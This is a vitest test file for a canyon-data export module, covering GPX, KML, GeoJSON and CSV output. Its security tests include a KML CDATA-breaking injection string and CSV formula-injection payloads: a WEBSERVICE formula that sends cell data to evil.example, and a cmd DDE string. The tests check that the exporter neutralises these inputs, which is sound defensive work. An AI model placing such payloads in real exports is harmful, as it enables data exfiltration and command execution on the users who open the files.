import { describe, it, expect } from "vitest";
import { buildCanyonExport } from "./canyonExport";
import { parseCsv } from "./csvImport/parseCsv";
import { parseAltNames, parseFloatStrict, parseIntStrict, parseLatLng, parseSources } from "./csvImport/canyonValueParsers";
import { detectCanyonColumns } from "./csvImport/canyonColumns";
import type { TCanyon } from "./canyonUtils";

function canyon(overrides: Partial<TCanyon> = {}): TCanyon {
  return {
    id: "c1",
    name: "Empress Canyon",
    latitude: -33.5,
    longitude: 150.3,
    altNames: [],
    vGrade: 3,
    aGrade: null,
    commitment: null,
    quality: null,
    numAbseils: 8,
    longestAbseil: 30,
    hours: 4,
    notes: null,
    attributes: {},
    updatedAt: "2026-06-01T00:00:00.000Z",
    ...overrides,
  } as unknown as TCanyon;
}

async function text(blob: Blob): Promise<string> {
  return await blob.text();
}

describe("buildCanyonExport — filenames", () => {
  it("slugs a single canyon name", async () => {
    const { filename } = buildCanyonExport([canyon({ name: "Empress Canyon!" })], "gpx");
    expect(filename).toBe("logjam-empress-canyon.gpx");
  });

  it("uses a datestamped collection name for multiple canyons", () => {
    const { filename } = buildCanyonExport([canyon(), canyon({ id: "c2" })], "kml");
    expect(filename).toMatch(/^logjam-canyons-\d{8}\.kml$/);
  });
});

describe("buildCanyonExport — GPX", () => {
  it("emits a waypoint with coords, name, and description", async () => {
    const { blob } = buildCanyonExport([canyon()], "gpx");
    const xml = await text(blob);
    expect(xml).toContain('<wpt lat="-33.5" lon="150.3">');
    expect(xml).toContain("<name>Empress Canyon</name>");
    expect(xml).toContain("V-grade: 3");
    expect(xml).toContain("Abseils: 8");
    expect(blob.type).toBe("application/gpx+xml");
  });

  it("XML-escapes special characters in the name", async () => {
    const { blob } = buildCanyonExport([canyon({ name: 'A & B <C> "D" \'E\'' })], "gpx");
    const xml = await text(blob);
    expect(xml).toContain("A &amp; B &lt;C&gt; &quot;D&quot; &apos;E&apos;");
    expect(xml).not.toContain("<C>");
  });
});

describe("buildCanyonExport — KML", () => {
  it("emits a Placemark with CDATA description and coordinates", async () => {
    const { blob } = buildCanyonExport([canyon()], "kml");
    const xml = await text(blob);
    expect(xml).toContain("<Placemark>");
    expect(xml).toContain("<![CDATA[");
    expect(xml).toContain("<coordinates>150.3,-33.5,0</coordinates>");
    expect(blob.type).toBe("application/vnd.google-earth.kml+xml");
  });

  // FECO-009: a `]]>` inside notes must not terminate the CDATA section early
  // — otherwise the rest of the description is parsed as XML markup, letting
  // a shared canyon's owner-authored notes inject elements into the file a
  // sharee exports and opens elsewhere.
  it("escapes a ]]> inside notes instead of letting it close the CDATA section early (FECO-009)", async () => {
    const malicious = canyon({
      notes: 'Approach via the north gully]]></description><Placemark><name>INJECTED',
    });
    const { blob } = buildCanyonExport([malicious], "kml");
    const xml = await text(blob);

    // The raw terminator must never appear mid-content — every "]]>" in the
    // output is the CDATA-splitting escape or the section's real end.
    expect(xml).not.toMatch(/gully\]\]>/);
    expect(xml).toContain("gully]]]]><![CDATA[>");

    // Parse it for real and confirm no injected sibling element was created —
    // exactly one Placemark, and the notes text survives intact inside it.
    const doc = new DOMParser().parseFromString(xml, "application/xml");
    expect(doc.getElementsByTagName("parsererror")).toHaveLength(0);
    const placemarks = doc.getElementsByTagName("Placemark");
    expect(placemarks).toHaveLength(1);
    const description = placemarks[0].getElementsByTagName("description")[0];
    expect(description.textContent).toContain(
      "Approach via the north gully]]></description><Placemark><name>INJECTED",
    );
  });
});

// A canyon record carrying every internal field the API can attach — these
// must NEVER appear in an exported file (EXPORT-2).
const INTERNAL_FIELD_OVERRIDES = {
  ownerId: "user-secret-owner-id",
  importBatchId: "batch-secret-id",
  importKey: "import-key-secret",
  forkedFromId: "forked-from-secret",
  ropeWikiId: 12345,
  ropeWikiSnapshot: { huge: "blob-of-scraped-data" },
  _count: { tripLogLinks: 3, shares: 2 },
  createdAt: "2026-05-01T00:00:00.000Z",
} as Partial<TCanyon>;

const EXPECTED_PROPERTY_KEYS = [
  "name",
  "altNames",
  "vGrade",
  "aGrade",
  "commitment",
  "quality",
  "numAbseils",
  "longestAbseil",
  "hours",
  "notes",
  // User-authored attributes now round-trip (EXPORT round-trip-complete).
  "sources",
  "customFields",
];

describe("buildCanyonExport — GeoJSON", () => {
  it("emits a FeatureCollection with a Point geometry", async () => {
    const { blob } = buildCanyonExport([canyon()], "geojson");
    const parsed = JSON.parse(await text(blob));
    expect(parsed.type).toBe("FeatureCollection");
    expect(parsed.features[0].geometry).toEqual({ type: "Point", coordinates: [150.3, -33.5] });
  });

  it("emits exactly the whitelisted properties — no internal fields (EXPORT-2)", async () => {
    const { blob } = buildCanyonExport([canyon(INTERNAL_FIELD_OVERRIDES)], "geojson");
    const parsed = JSON.parse(await text(blob));
    const properties = parsed.features[0].properties as Record<string, unknown>;
    expect(Object.keys(properties).sort()).toEqual([...EXPECTED_PROPERTY_KEYS].sort());
  });

  it("emits sources as {label, url} objects and custom fields under customFields", async () => {
    const c = canyon({
      attributes: {
        sources: [
          ["RopeWiki", "https://ropewiki.com/Empress_Falls"],
          ["Guidebook p.42", ""],
        ],
        customFields: { rockType: "sandstone", firstDescentYear: 1974 },
      },
    });
    const { blob } = buildCanyonExport([c], "geojson");
    const parsed = JSON.parse(await text(blob));
    const properties = parsed.features[0].properties as Record<string, unknown>;
    expect(properties.sources).toEqual([
      { label: "RopeWiki", url: "https://ropewiki.com/Empress_Falls" },
      { label: "Guidebook p.42", url: "" },
    ]);
    expect(properties.customFields).toEqual({
      rockType: "sandstone",
      firstDescentYear: 1974,
    });
  });

  it("emits empty sources/customFields for a canyon with no attributes", async () => {
    const { blob } = buildCanyonExport([canyon()], "geojson");
    const parsed = JSON.parse(await text(blob));
    const properties = parsed.features[0].properties as Record<string, unknown>;
    expect(properties.sources).toEqual([]);
    expect(properties.customFields).toEqual({});
  });
});

describe("buildCanyonExport — internal fields leak nowhere", () => {
  it.each(["gpx", "kml", "geojson", "csv"] as const)(
    "%s output contains no internal identifiers",
    async (format) => {
      const { blob } = buildCanyonExport([canyon(INTERNAL_FIELD_OVERRIDES)], format);
      const output = await text(blob);
      expect(output).not.toContain("user-secret-owner-id");
      expect(output).not.toContain("batch-secret-id");
      expect(output).not.toContain("import-key-secret");
      expect(output).not.toContain("forked-from-secret");
      expect(output).not.toContain("blob-of-scraped-data");
      expect(output).not.toContain("ropeWikiSnapshot");
      expect(output).not.toContain("_count");
    },
  );
});

describe("buildCanyonExport — CSV (EXPORT-1)", () => {
  function csvFile(content: string): File {
    return new File([content], "export.csv", { type: "text/csv" });
  }

  it("emits the import template's columns in order", async () => {
    const { blob, filename } = buildCanyonExport([canyon()], "csv");
    const { headers } = await parseCsv(csvFile(await text(blob)));
    expect(headers).toEqual([
      "name",
      "latitude",
      "longitude",
      "altNames",
      "vGrade",
      "aGrade",
      "commitment",
      "quality",
      "numAbseils",
      "longestAbseil",
      "hours",
      "notes",
      // `sources` is always present; custom-field (`attr:<key>`) columns appear
      // only when some canyon carries them (see the round-trip test below).
      "sources",
    ]);
    expect(filename).toBe("logjam-empress-canyon.csv");
    expect(blob.type).toBe("text/csv");
  });

  it("appends one attr:<key> column per custom-field key across the set, sorted, auto-mapping on re-import", async () => {
    const withFields = canyon({
      id: "c-fields",
      attributes: { customFields: { rockType: "granite", grade: "R2" } },
    });
    const other = canyon({
      id: "c-other",
      attributes: { customFields: { rockType: "basalt", waterTemp: "cold" } },
    });
    const { blob } = buildCanyonExport([withFields, other], "csv");
    const { headers } = await parseCsv(csvFile(await text(blob)));
    // Union of keys, sorted, each prefixed — after the fixed columns.
    expect(headers.slice(-3)).toEqual(["attr:grade", "attr:rockType", "attr:waterTemp"]);
    // Every attr column auto-maps straight back to its custom-field role.
    const roles = detectCanyonColumns(headers);
    expect(roles["attr:grade"]).toBe("attr:grade");
    expect(roles["attr:rockType"]).toBe("attr:rockType");
    expect(roles["attr:waterTemp"]).toBe("attr:waterTemp");
    expect(roles["sources"]).toBe("sources");
  });

  it("round-trips through the app's own CSV parser, including gnarly notes", async () => {
    const gnarly = canyon({
      id: "c-gnarly",
      name: 'Say "G\'day", mate',
      latitude: -33.123456,
      longitude: 150.654321,
      altNames: ["Gobsmacker", "Bubble Bath"],
      vGrade: 5,
      aGrade: 2,
      commitment: 4,
      quality: 4.5,
      numAbseils: 12,
      longestAbseil: 55.5,
      hours: 7.25,
      notes: 'Line one, with comma\nLine two has "quotes" and a ; semicolon',
    });
    const plain = canyon({ id: "c-plain" });

    const { blob } = buildCanyonExport([gnarly, plain], "csv");
    const { rows } = await parseCsv(csvFile(await text(blob)));
    expect(rows).toHaveLength(2);

    const [r1, r2] = rows;
    expect(r1.name).toBe('Say "G\'day", mate');
    expect(parseLatLng(r1.latitude)).toEqual({ ok: true, value: -33.123456 });
    expect(parseLatLng(r1.longitude)).toEqual({ ok: true, value: 150.654321 });
    expect(parseAltNames(r1.altNames)).toEqual({
      ok: true,
      value: ["Gobsmacker", "Bubble Bath"],
    });
    expect(parseIntStrict(r1.vGrade, "vGrade")).toEqual({ ok: true, value: 5 });
    expect(parseIntStrict(r1.aGrade, "aGrade")).toEqual({ ok: true, value: 2 });
    expect(parseIntStrict(r1.commitment, "commitment")).toEqual({ ok: true, value: 4 });
    expect(parseFloatStrict(r1.quality, "quality")).toEqual({ ok: true, value: 4.5 });
    expect(parseIntStrict(r1.numAbseils, "numAbseils")).toEqual({ ok: true, value: 12 });
    expect(parseFloatStrict(r1.longestAbseil, "longestAbseil")).toEqual({ ok: true, value: 55.5 });
    expect(parseFloatStrict(r1.hours, "hours")).toEqual({ ok: true, value: 7.25 });
    expect(r1.notes).toBe('Line one, with comma\nLine two has "quotes" and a ; semicolon');

    // Nulls round-trip as empty cells (parsers return NaN-as-"no value" for "").
    expect(r2.aGrade).toBe("");
    expect(r2.commitment).toBe("");
    expect(r2.quality).toBe("");
    expect(r2.notes).toBe("");
    expect(r2.altNames).toBe("");
  });

  it("round-trips sources and custom fields through parseCsv + the role parsers, with empty cells", async () => {
    const rich = canyon({
      id: "c-rich",
      attributes: {
        sources: [
          ["RopeWiki", "https://ropewiki.com/Empress_Falls"],
          ["Guidebook, 2nd ed.", ""],
        ],
        // A string value and a numeric value.
        customFields: { rockType: "sandstone", firstDescentYear: 1974 },
      },
    });
    // No sources; only ONE of the two custom-field keys present.
    const sparse = canyon({
      id: "c-sparse",
      attributes: { customFields: { rockType: "granite" } },
    });

    const { blob } = buildCanyonExport([rich, sparse], "csv");
    const { headers, rows } = await parseCsv(csvFile(await text(blob)));
    // Union of keys across the set, sorted.
    expect(headers.slice(-3)).toEqual(["sources", "attr:firstDescentYear", "attr:rockType"]);
    const [r1, r2] = rows;

    // Sources parse back label-for-label, URL-for-URL (JSON tuple form).
    expect(parseSources(r1.sources)).toEqual({
      ok: true,
      value: [
        ["RopeWiki", "https://ropewiki.com/Empress_Falls"],
        ["Guidebook, 2nd ed.", ""],
      ],
    });
    // No sources → empty cell → empty list.
    expect(r2.sources).toBe("");
    expect(parseSources(r2.sources)).toEqual({ ok: true, value: [] });

    // Custom-field cells re-ingest verbatim (the `attr:<key>` role stores the
    // raw string). Numeric values serialise/parse as their string form.
    expect(r1["attr:rockType"]).toBe("sandstone");
    expect(r1["attr:firstDescentYear"]).toBe("1974");
    // A canyon lacking a field gets an empty cell for that column.
    expect(r2["attr:rockType"]).toBe("granite");
    expect(r2["attr:firstDescentYear"]).toBe("");
  });

  // FECO-010: a cell beginning with =, +, -, @ opens as a live formula in
  // Excel/LibreOffice/Sheets. A shared canyon's owner-authored name/notes/
  // custom-field value is attacker-reachable text that survives export
  // unmodified without this guard.
  describe("formula-injection guard (FECO-010)", () => {
    it("prefixes a name/notes cell starting with = with a neutralizing apostrophe", async () => {
      const malicious = canyon({
        name: '=WEBSERVICE("https://evil.example/?d="&A1)',
        notes: "+SUM(1,2)",
      });
      const { blob } = buildCanyonExport([malicious], "csv");
      const { rows } = await parseCsv(csvFile(await text(blob)));
      expect(rows[0].name).toBe('\'=WEBSERVICE("https://evil.example/?d="&A1)');
      expect(rows[0].notes).toBe("'+SUM(1,2)");
    });

    it("prefixes a custom-field value starting with @ or - with a neutralizing apostrophe", async () => {
      const malicious = canyon({
        attributes: { customFields: { danger: "@SUM(1,2)", warning: "-2+3+cmd|' /C calc'!A1" } },
      });
      const { blob } = buildCanyonExport([malicious], "csv");
      const { rows } = await parseCsv(csvFile(await text(blob)));
      expect(rows[0]["attr:danger"]).toBe("'@SUM(1,2)");
      expect(rows[0]["attr:warning"]).toBe("'-2+3+cmd|' /C calc'!A1");
    });

    it("does NOT prefix latitude/longitude — a negative coordinate is a plain number, not a formula", async () => {
      const southernWestern = canyon({ latitude: -33.5, longitude: -70.2 });
      const { blob } = buildCanyonExport([southernWestern], "csv");
      const raw = await text(blob);
      // The neutralizing apostrophe must never reach the coordinate cells —
      // it would corrupt the app's own round-trip via parseLatLng.
      expect(raw).not.toContain("'-33.5");
      expect(raw).not.toContain("'-70.2");
      const { rows } = await parseCsv(csvFile(raw));
      expect(parseLatLng(rows[0].latitude)).toEqual({ ok: true, value: -33.5 });
      expect(parseLatLng(rows[0].longitude)).toEqual({ ok: true, value: -70.2 });
    });

    it("leaves an ordinary name/notes cell untouched", async () => {
      const plain = canyon({ name: "Empress Canyon", notes: "Nice canyon" });
      const { blob } = buildCanyonExport([plain], "csv");
      const { rows } = await parseCsv(csvFile(await text(blob)));
      expect(rows[0].name).toBe("Empress Canyon");
      expect(rows[0].notes).toBe("Nice canyon");
    });
  });
});
